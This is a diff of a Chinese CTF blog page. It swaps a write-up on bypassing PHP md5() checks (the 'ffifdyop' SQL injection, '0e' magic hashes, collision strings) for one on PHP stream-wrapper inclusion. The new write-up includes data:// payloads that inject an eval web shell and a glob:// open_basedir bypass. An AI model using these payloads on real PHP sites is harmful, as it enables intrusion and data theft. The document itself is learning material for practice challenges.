@@ -13,29 +13,29 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="PHP md5()函数绕过">
+  <meta name="description" content="">
   <meta name="author" content="hututu">
   <meta name="keywords" content="">
-  <meta name="description" content="PHP md5()函数绕过">
+  <meta name="description" content="题目直接给出了源码  一些新东西👇open_basedir：将php所能打开的文件限制在指定的目录树中pathinfo()：以数组的形式返回关于文件路径的信息            PATHINFO_DIRNAME - 只返回 dirname            PATHINFO_BASENAME - 只返回 basename            PATHINFO_EXTENSION - 只">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BJDCTF Easy_MD5">
-<meta property="og:url" content="http://htt.github.io/2021/10/06/BJDCTF-Easy-MD5/index.html">
+<meta property="og:title" content="GXUCTF easy-伪协议">
+<meta property="og:url" content="http://htt.github.io/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
 <meta property="og:site_name" content="翻斗花园2-1001">
-<meta property="og:description" content="PHP md5()函数绕过">
+<meta property="og:description" content="题目直接给出了源码  一些新东西👇open_basedir：将php所能打开的文件限制在指定的目录树中pathinfo()：以数组的形式返回关于文件路径的信息            PATHINFO_DIRNAME - 只返回 dirname            PATHINFO_BASENAME - 只返回 basename            PATHINFO_EXTENSION - 只">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg">
-<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv5pz39fwhj60l305gmxe02.jpg">
-<meta property="og:image" content="https://tva2.sinaimg.cn/large/007aD2tWgy1gv5q4kysamj61bg0riqp702.jpg">
-<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv5qizplz3j60tl07q3z202.jpg">
-<meta property="article:published_time" content="2021-10-06T03:40:45.000Z">
-<meta property="article:modified_time" content="2021-10-06T13:34:43.350Z">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9brxnl0ej61ne0chjwk02.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9brhg4dxj61l0091ace02.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c3k8uqpj60it032t8u02.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c2kzk3ij61hw096ac902.jpg">
+<meta property="article:published_time" content="2021-10-08T12:20:53.000Z">
+<meta property="article:modified_time" content="2021-10-09T12:33:02.560Z">
 <meta property="article:author" content="hututu">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="MD5">
+<meta property="article:tag" content="PHP伪协议">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg">
+<meta name="twitter:image" content="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg">
   
-  <title>BJDCTF Easy_MD5 - 翻斗花园2-1001</title>
+  <title>GXUCTF easy-伪协议 - 翻斗花园2-1001</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -181,7 +181,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BJDCTF Easy_MD5">
+            <span class="h2" id="subtitle" title="GXUCTF easy-伪协议">
               
             </span>
 
@@ -191,8 +191,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-06 11:40" pubdate>
-        2021年10月6日 中午
+      <time datetime="2021-10-08 20:20" pubdate>
+        2021年10月8日 晚上
       </time>
     </span>
   
@@ -228,43 +228,34 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BJDCTF Easy_MD5</h1>
+            <h1 style="display: none">GXUCTF easy-伪协议</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年10月6日 晚上
+                  本文最后更新于：2021年10月9日 晚上
                 
               </p>
             
             <div class="markdown-body">
-              <p>1、打开是一个查询框，用burp发包看一下</p>
-<p><img src="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>在Response里有一句提示<br><code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
-<p>首先说明一下这个函数<br>👉md5($pass, true)：$pass是待加密字符串，第二个参数设为true，控制输出为原始16字符二进制格式</p>
-<p>所以我们要想办法结合这个函数来进行SQL注入，这里看了大佬的wp，学习到一个类似万能密码的东东<code>ffifdyop</code></p>
-<p>这个字符串经过md5加密后会输出一串<code>&#39;or&#39;6XXXXX</code>，结合查询语句<br>👉<code>select * from &#39;admin&#39; where password = &#39;&#39;or&#39;6XXXXX&#39;</code><br>后面的’6XXXXX’就等价于一个永真式，至此就绕过了md5函数，注入成功！</p>
-<p>2、下面来到第二个界面，一句大大的Do you like MD5，那必然like..在源码里找到提示信息</p>
-<p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv5pz39fwhj60l305gmxe02.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>这里涉及到PHP的’==’弱比较漏洞，如果进行比较的两个值类型不同，PHP会首先将其化为相同类型再进行比较，在处理哈希字符串时，它会把所有以’0e’开头的哈希值都解析为0，所以这里传两个哈希后’0e’开头的字符串即可</p>
-<p>附上一些可用字符串：</p>
-<ul>
-<li>QNKCDZO</li>
-<li>240610708</li>
-<li>s878926199a</li>
-<li>s155964671a</li>
-</ul>
-<p>也附上一个弱类型比较表给大家</p>
-<p><img src="https://tva2.sinaimg.cn/large/007aD2tWgy1gv5q4kysamj61bg0riqp702.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>3、绕过成功，来到第三个界面</p>
-<p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv5qizplz3j60tl07q3z202.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>‘===’进行比较时，会判断值+类型，可以选择强碰撞或者md5数组绕过</p>
-<p>PHP的md5()函数是无法处理数组的，在传入的参数为数组时会返回NULL，因此只需要传入两个不同值的数组，得到的结果就是’NULL === NULL’啦</p>
-<p>强碰撞的话，这里给出几个md5值相同的字符串：</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$s1 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br>$s3 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>然后就顺利得到flag啦~</p>
+              <p>题目直接给出了源码</p>
+<p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>一些新东西👇<br>open_basedir：将php所能打开的文件限制在指定的目录树中<br>pathinfo()：以数组的形式返回关于文件路径的信息<br>            PATHINFO_DIRNAME - 只返回 dirname<br>            PATHINFO_BASENAME - 只返回 basename<br>            PATHINFO_EXTENSION - 只返回 extension<br>            PATHINFO_FILENAME - 只返回 filename</p>
+<p>首先对$text进行了匹配，要求是字符串”how_to_bypass?”，可以利用伪协议进行写入<br><code>data://text/plain,how_to_bypass?</code></p>
+<p>继续对$file传入参数的后缀进行了检查，如果是php就进行文件包含，这里的绕过只需要在最后加一个.php就可以，很easy~</p>
+<p>剩下的问题就是进行flag文件的读取了，现在我们是不知道flag所在文件的名称和路径的，我试着读了一下当前目录下的flag.php..失败了</p>
+<p>这里看了大佬的博客，学到了新的知识=&gt;利用glob://伪协议进行目录遍历是可以无视open_basedir的</p>
+<p><code>$file=data://text/plain,&lt;?php @eval([$_REQUEST[1]]);?&gt;.php&amp;1=var_dump(scandir(&#39;glob:///*&#39;));</code></p>
+<p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9brxnl0ej61ne0chjwk02.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>其实open_basedir对解这道题并没啥影响，flag文件就在当前目录下，所有直接用scandir(‘.’)就能看到</p>
+<p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9brhg4dxj61l0091ace02.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>得到文件名后就可以进行读取了，可以file_get_contents直接读<br><code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=echo file_get_contents(&#39;fll11llaaaggg.php&#39;);</code></p>
+<p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c3k8uqpj60it032t8u02.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>我真的是个憨批..这里读出的flag在源码里，我还以为没读到来回搞了好久，最后去问了出题人..给自己一锤😢</p>
+<p>或者php://filter读取</p>
+<p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c2kzk3ij61hw096ac902.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>解码得到flag</p>
 <hr>
-<p>之前的博客没有好好经营，写的乱七八糟，后面也懒得去改动，就一直在本地写一些记录，结果前段时间电脑出了问题，一大半笔记都弄丢了…<br>由此可见还是有一个在线的blog比较稳妥。搬家搬家，就在这里重新开始吧~</p>
+<p>最近接触了不少伪协议相关的题目，后面看看需要整理一下这方面的知识</p>
 <hr>
 
             </div>
@@ -275,7 +266,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">BUU刷题记录</a>
+                      <a class="hover-with-bg" href="/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E9%A2%98/">一些杂题</a>
                     
                   </div>
                 
@@ -283,9 +274,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/tags/MD5/">MD5</a>
+                      <a class="hover-with-bg" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>
                     
                   </div>
                 
@@ -302,15 +291,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BJDCTF ZJCTF不过如此</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/">
+                        <span class="hidden-mobile">BJDCTF ZJCTF不过如此</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
